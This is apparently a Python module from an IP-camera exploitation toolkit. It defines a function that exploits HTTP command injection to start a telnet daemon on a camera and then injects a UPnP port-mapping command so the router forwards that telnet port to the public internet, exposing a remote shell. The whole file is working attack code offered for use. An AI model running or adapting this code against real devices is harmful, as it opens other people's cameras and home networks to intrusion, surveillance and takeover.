from .. import utils
from .. import scripts
from .. import decorators
import logging

"""
Imports:
    ..utils
    ..scripts
    ..decorators
    logging

Contains:
    bypass_firewall_telnet

Constants defined here:
    DEFAULT_FORWARDED_TELNET_PORT
"""

logger = logging.getLogger(__name__)
logger.info(f'Library imported: {__name__}')

DEFAULT_FORWARDED_TELNET_PORT = 1025

@decorators.debug()
def bypass_firewall_telnet \
        (
            http,
            external_host = None,
            internal_telnet_port = DEFAULT_FORWARDED_TELNET_PORT,
            external_telnet_port = DEFAULT_FORWARDED_TELNET_PORT,
        ):
    """
    Uses HTTP command injection to start telnet,
    ... then uses UPnP to port-forward telnet
    ... through the routers firewall

    If successful, you will be able to telnet
    ... into the camera using the public-facing
    ... IP address

    Returns:
        {
            'internal_host': internal_host,
            'external_host': external_host,
            'internal_telnet_port': internal_telnet_port,
            'external_telnet_port': external_telnet_port,
            '_success': success,
        }
    """

    internal_host = http.host

    if external_host is None:
        external_host = utils.get_external_ip()

        logging.debug \
        (
            'External host was not specified, got '
            f'LAN\'s public IP: {external_host}'
        )

        logging.info \
        (
            'If camera is inside same LAN as PC, '
            'they will share the same public IP'
        )

    payload_start_telnet = f'telnetd -p {internal_telnet_port}'
    payload_map_port = \
    (
        f'upnpc-static -a {internal_host} '
        f'{internal_telnet_port} {external_telnet_port} TCP'
    )

    ret_start_telnet = scripts.command_inject \
    (
        http,
        payload_start_telnet,
        blind = True,
        clear = False,
    )

    if not ret_start_telnet:
        logging.debug \
        (
            'Command injection reports that it failed '
            'to start telnet'
        )

    ret_map_port = scripts.command_inject \
    (
        http,
        payload_map_port,
        blind = True, # For speed, it assumes it succeeds
        clear = True, # Finally, clear injection
    )

    if not ret_map_port:
        logging.debug \
        (
            'Command injection reports that it failed '
            'to forward telnet port'
        )

    success = ret_start_telnet and ret_map_port

    data = \
    {
        'internal_host': internal_host,
        'external_host': external_host,
        'internal_telnet_port': internal_telnet_port,
        'external_telnet_port': external_telnet_port,
        '_success': success,
    }

    return data
